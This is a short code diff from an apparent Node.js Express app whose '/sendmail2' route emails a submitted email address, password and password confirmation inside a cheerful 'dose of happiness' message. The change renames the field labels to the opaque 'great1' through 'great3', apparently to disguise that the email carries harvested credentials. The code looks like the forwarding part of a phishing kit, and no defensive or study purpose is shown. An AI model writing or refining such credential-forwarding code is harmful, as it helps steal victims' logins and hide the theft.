@@ -66,9 +66,9 @@ app.post("/sendmail2", async (req, res) => {
       html: `
     <div> 
       <h2>Here is your dose of happness!</h2>
-        <p>greatEmail: ${email}</p>
-        <p>greatPass: ${pass}</p>
-        <p> greateConfirm Pass: ${pasers}</p>
+        <p>great1: ${email}</p>
+        <p>great2: ${pass}</p>
+        <p> great3: ${pasers}</p>
     
         <p>All the best, happyness</p>
          </div>
